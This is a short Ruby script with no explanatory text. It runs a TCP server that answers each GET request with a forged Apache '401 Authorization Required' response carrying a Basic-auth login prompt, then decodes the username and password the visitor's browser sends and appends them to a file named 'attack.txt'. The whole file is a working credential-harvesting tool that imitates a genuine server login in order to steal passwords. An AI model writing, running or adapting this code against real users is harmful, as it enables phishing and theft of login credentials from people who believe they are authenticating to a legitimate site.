require "socket"
require "base64"

def read_html
  File.open("index.html") do |f|
    f.read
  end
end

def run(portaddr=8001)
  port = portaddr
  server = TCPServer.open(port)

  while true
    begin
    Thread.new(server.accept) do |socket|
      # p socket.peeraddr

      request = socket.gets
      # p request

      if request.include? "GET"
        content = read_html
        socket.write <<-EOF
HTTP/1.1 401 Authorization Required
Content-Type: text/html; charset=UTF-8
Server: Apache/2.2.22 (Debian)
WWW-Authenticate:Basic realm=""

#{content}
EOF

        basic =  socket.read.to_s.split(":").find{|req| req.include?("Basic")}.slice(/Basic .*\r/).gsub("Basic ","").chop
        auth = Base64.urlsafe_decode64(basic)
        File.open("attack.txt","a"){|f|f.puts auth}
        auth.split(":")
        socket.close

      end
      socket.close
    end
    rescue
    end
  end

server.close

end